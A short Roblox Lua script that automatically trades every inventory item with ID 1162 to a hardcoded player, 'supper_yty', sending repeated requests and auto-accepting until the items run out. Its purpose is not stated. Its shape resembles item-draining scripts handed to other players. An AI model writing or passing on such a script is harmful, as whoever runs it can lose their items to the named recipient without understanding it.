local Players=game:GetService("Players")
local ReplicatedStorage=game:GetService("ReplicatedStorage")
local LocalPlayer=Players.LocalPlayer
local TARGET="supper_yty"
local TARGET_ID=1162
local MAX_PER_TRADE=16
local TRADE_REQUEST=ReplicatedStorage:WaitForChild("Events"):WaitForChild("Trade"):WaitForChild("SendRequest")
local ADD_ITEM=ReplicatedStorage:WaitForChild("Events"):WaitForChild("Trade"):WaitForChild("AddItem")
local ACCEPT=ReplicatedStorage:WaitForChild("Events"):WaitForChild("Trade"):WaitForChild("Accept")
local TRADE_GUI=LocalPlayer.PlayerGui:WaitForChild("Trade")
local function log(a)print("[TRADE]",a)end
local function countItems()
local inv=LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Items") or LocalPlayer
local c=0
for _,v in pairs(inv:GetDescendants())do
local id=v:FindFirstChild("Id") or v:FindFirstChild("ItemId") or v:GetAttribute("Id")
if id and tonumber(id.Value or id)==TARGET_ID then
c=c+1
end
end
return c
end
local function getItems()
local inv=LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Items") or LocalPlayer
local t={}
for _,v in pairs(inv:GetDescendants())do
local id=v:FindFirstChild("Id") or v:FindFirstChild("ItemId") or v:GetAttribute("Id")
if id and tonumber(id.Value or id)==TARGET_ID then
table.insert(t,v)
end
end
return t
end
local function waitTrade()
while true do
local g=TRADE_GUI:FindFirstChild("Frame") or TRADE_GUI:FindFirstChildWhichIsA("Frame")
if g and g.Visible then
log("trade detected")
return
end
task.wait(.5)
end
end
local function waitOtherAccept()
while true do
local p2=TRADE_GUI:FindFirstChild("Player2Accepted",true)
if p2 and p2.Value==true then
log("other accepted")
return
end
task.wait(.5)
end
end
local function sendRequests()
while true do
local p=Players:FindFirstChild(TARGET)
if p then
log("sending trade request")
pcall(function()TRADE_REQUEST:FireServer(p)end)
end
task.wait(10)
end
end
task.spawn(sendRequests)
while true do
repeat task.wait(1) until Players:FindFirstChild(TARGET)
waitTrade()
local items=getItems()
local added=0
for _,it in pairs(items)do
if added>=MAX_PER_TRADE then break end
log("adding item "..TARGET_ID)
pcall(function()ADD_ITEM:FireServer(it)end)
added=added+1
task.wait(.2)
end
if added==0 then
log("no items left aborting")
task.wait(3)
else
log("accepting trade")
pcall(function()ACCEPT:FireServer()end)
waitOtherAccept()
repeat task.wait(1) until not (TRADE_GUI:FindFirstChild("Frame") and TRADE_GUI.Frame.Visible)
log("trade finished")
end
if countItems()==0 then
log("all items sent")
break
end
task.wait(2)
end
